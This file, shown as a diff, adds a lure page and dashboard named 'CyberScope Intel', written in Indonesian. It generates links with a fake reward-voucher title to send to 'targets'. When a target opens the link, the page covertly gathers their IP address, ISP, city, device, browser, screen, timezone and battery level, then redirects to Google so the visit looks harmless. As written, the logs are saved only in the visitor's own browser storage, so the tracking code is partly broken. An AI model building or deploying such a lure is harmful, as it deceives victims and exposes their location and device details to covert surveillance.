@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberScope - Advanced Device Intelligence</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; 
+            background: #090d16; 
+            color: #f1f5f9; 
+            padding: 20px; 
+            display: flex; 
+            justify-content: center; 
+        }
+        .container { width: 100%; max-width: 600px; }
+        
+        .header {
+            background: linear-gradient(135deg, #1e1b4b 0%, #0f172a 100%);
+            border: 1px solid #312e81;
+            padding: 24px;
+            border-radius: 20px;
+            text-align: center;
+            margin-bottom: 24px;
+            box-shadow: 0 15px 35px -5px rgba(0, 0, 0, 0.6);
+        }
+        .header h1 { font-size: 22px; font-weight: 800; color: #818cf8; letter-spacing: 1px; text-transform: uppercase; }
+        .header p { font-size: 13px; color: #94a3b8; margin-top: 6px; }
+
+        .card { 
+            background: #111827; 
+            border: 1px solid #1f2937;
+            padding: 20px; 
+            margin-bottom: 18px; 
+            border-radius: 16px; 
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3); 
+        }
+        
+        label { display: block; font-weight: 600; font-size: 13px; color: #cbd5e1; margin-bottom: 8px; margin-top: 12px; }
+        label:first-child { margin-top: 0; }
+        
+        input { 
+            width: 100%; 
+            padding: 12px 16px; 
+            background: #030712; 
+            border: 1px solid #374151; 
+            color: #fff; 
+            border-radius: 10px; 
+            font-size: 14px; 
+            margin-bottom: 10px; 
+        }
+        input:focus { outline: none; border-color: #6366f1; box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2); }
+
+        button { 
+            width: 100%; 
+            padding: 14px; 
+            background: #4f46e5; 
+            color: white; 
+            border: none; 
+            border-radius: 10px; 
+            font-size: 15px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            transition: all 0.2s;
+            margin-top: 6px;
+            box-shadow: 0 4px 12px rgba(79, 70, 229, 0.4);
+        }
+        button:hover { background: #4338ca; transform: translateY(-1px); }
+        .btn-success { background: #059669; box-shadow: 0 4px 12px rgba(5, 150, 105, 0.4); }
+        .btn-success:hover { background: #047857; }
+        .btn-danger { background: #b91c1c; font-size: 12px; padding: 8px; margin-top: 10px; }
+        .btn-danger:hover { background: #991b1b; }
+
+        .log-card {
+            background: #030712;
+            border: 1px solid #1f2937;
+            padding: 14px;
+            border-radius: 12px;
+            margin-top: 12px;
+            font-size: 13px;
+        }
+        .log-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1f2937; padding-bottom: 8px; margin-bottom: 8px; }
+        .log-header span { color: #818cf8; font-weight: 700; }
+        .log-time { color: #94a3b8; font-size: 11px; }
+
+        .log-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
+        .log-item p { margin: 3px 0; color: #94a3b8; font-size: 12px; }
+        .log-item span { color: #f8fafc; font-weight: 600; }
+
+        .badge { background: #065f46; color: #a7f3d0; padding: 3px 8px; border-radius: 6px; font-size: 10px; font-weight: 700; display: inline-block; }
+    </style>
+</head>
+<body>
+
+    <!-- DASHBOARD UTAMA (PEMBUAT LINK) -->
+    <div class="container" id="generatorView">
+        <div class="header">
+            <h1>CYBERSCOPE INTEL</h1>
+            <p>Advanced Device & Network Monitoring Dashboard</p>
+        </div>
+        
+        <div class="card">
+            <label style="color: #818cf8; font-size: 14px;">1. Konfigurasi Judul Umpan (Hook):</label>
+            <input type="text" id="targetTitle" value="🎁 Klaim Reward & Cek Voucher Spesial 2026">
+            
+            <button onclick="generateLink()">Buat Tautan Pelacak</button>
+
+            <div id="resultLinkSection" style="display:none; margin-top: 15px;">
+                <label style="color: #34d399;">Tautan Unik Siap Dikirim:</label>
+                <input type="text" id="generatedLinkOutput" readonly>
+                <button class="btn-success" onclick="salinLink()">Salin Tautan</button>
+            </div>
+        </div>
+
+        <div class="card">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                <label style="color: #facc15; margin:0;">2. Live Target Intelligence Logs:</label>
+                <button onclick="clearLogs()" class="btn-danger" style="width: auto;">Hapus Log</button>
+            </div>
+            <div id="logContainer">
+                <p style="color: #64748b; font-size: 13px; font-style: italic; text-align: center; padding: 20px;">Belum ada target yang mengakses tautan.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- TAMPILAN UMPAN (YANG DIBUKA TARGET) -->
+    <div class="container" id="targetView" style="display:none; text-align: center; padding-top: 40px;">
+        <div class="card" style="padding: 40px 20px;">
+            <div style="font-size: 48px; margin-bottom: 15px;">⏳</div>
+            <h2 id="viewTitle" style="font-size: 18px; color: #fff; margin-bottom: 10px;">Memuat Halaman...</h2>
+            <p style="color: #94a3b8; font-size: 13px;">Silakan tunggu beberapa saat, sistem sedang memproses informasi...</p>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const isTargetMode = urlParams.get('target');
+
+        if (isTargetMode) {
+            document.getElementById('generatorView').style.display = 'none';
+            document.getElementById('targetView').style.display = 'block';
+            document.getElementById('viewTitle').innerText = decodeURIComponent(urlParams.get('title') || 'Informasi Penting');
+            eksekusiPelacakanTarget();
+        } else {
+            muatLogTarget();
+        }
+
+        function generateLink() {
+            let title = document.getElementById('targetTitle').value.trim();
+            if (!title) title = "Info Penting";
+
+            let baseUrl = window.location.href.split('?')[0];
+            let finalLink = `${baseUrl}?target=true&title=${encodeURIComponent(title)}`;
+
+            document.getElementById('resultLinkSection').style.display = 'block';
+            document.getElementById('generatedLinkOutput').value = finalLink;
+        }
+
+        function salinLink() {
+            let copyText = document.getElementById('generatedLinkOutput');
+            copyText.select();
+            document.execCommand('copy');
+            alert("Tautan berhasil disalin! Silakan kirimkan ke target.");
+        }
+
+        async function eksekusiPelacakanTarget() {
+            let infoData = {
+                waktu: new Date().toLocaleString('id-ID'),
+                ip: "Mendeteksi...",
+                isp: "Mendeteksi...",
+                lokasi: "Mendeteksi...",
+                device: navigator.platform || "Unknown",
+                browser: getBrowserName(navigator.userAgent),
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+                battery: "Tidak tersedia"
+            };
+
+            // Ambil Info Baterai jika didukung device target
+            if (navigator.getBattery) {
+                try {
+                    let batt = await navigator.getBattery();
+                    infoData.battery = `${Math.round(batt.level * 100)}% ${batt.charging ? '(Charging)' : ''}`;
+                } catch(e) {}
+            }
+
+            try {
+                let response = await fetch('https://ipapi.co/json/');
+                let data = await response.json();
+                infoData.ip = data.ip || "Rahasia";
+                infoData.isp = data.org || "Operator Seluler / ISP Lokal";
+                infoData.lokasi = `${data.city || 'Kota'}, ${data.region || 'Provinsi'} (${data.country_name || 'Negara'})`;
+            } catch (e) {
+                infoData.ip = "Jaringan Terproteksi";
+                infoData.isp = "Private Network";
+                infoData.lokasi = "Tidak terdeteksi";
+            }
+
+            let existingLogs = JSON.parse(localStorage.getItem('cyberscope_logs')) || [];
+            existingLogs.unshift(infoData);
+            localStorage.setItem('cyberscope_logs', JSON.stringify(existingLogs));
+
+            // Redirect halus setelah 2 detik agar target mengira ini halaman biasa
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 2500);
+        }
+
+        function getBrowserName(ua) {
+            if (ua.includes("Firefox")) return "Mozilla Firefox";
+            if (ua.includes("SamsungBrowser")) return "Samsung Internet";
+            if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+            if (ua.includes("Trident")) return "Internet Explorer";
+            if (ua.includes("Edge")) return "Microsoft Edge";
+            if (ua.includes("Chrome")) return "Google Chrome";
+            if (ua.includes("Safari")) return "Apple Safari";
+            return "Browser Lainnya";
+        }
+
+        function muatLogTarget() {
+            let logs = JSON.parse(localStorage.getItem('cyberscope_logs')) || [];
+            let container = document.getElementById('logContainer');
+
+            if (logs.length === 0) return;
+
+            container.innerHTML = "";
+            logs.forEach((log, index) => {
+                let box = document.createElement('div');
+                box.className = 'log-card';
+                box.innerHTML = `
+                    <div class="log-header">
+                        <span>TARGET #${logs.length - index}</span>
+                        <span class="badge">ONLINE</span>
+                        <span class="log-time">${log.waktu}</span>
+                    </div>
+                    <div class="log-grid">
+                        <div class="log-item">
+                            <p>IP Address: <span>${log.ip}</span></p>
+                            <p>Provider/ISP: <span>${log.isp}</span></p>
+                            <p>Lokasi: <span>${log.lokasi}</span></p>
+                            <p>Baterai HP: <span>${log.battery}</span></p>
+                        </div>
+                        <div class="log-item">
+                            <p>Perangkat: <span>${log.device}</span></p>
+                            <p>Browser: <span>${log.browser}</span></p>
+                            <p>Resolusi: <span>${log.screen}</span></p>
+                            <p>Zona Waktu: <span>${log.timezone}</span></p>
+                        </div>
+                    </div>
+                `;
+                container.appendChild(box);
+            });
+        }
+
+        function clearLogs() {
+            if (confirm("Hapus semua log riwayat target?")) {
+                localStorage.removeItem('cyberscope_logs');
+                location.reload();
+            }
+        }
+    </script>
+</body>
+</html>
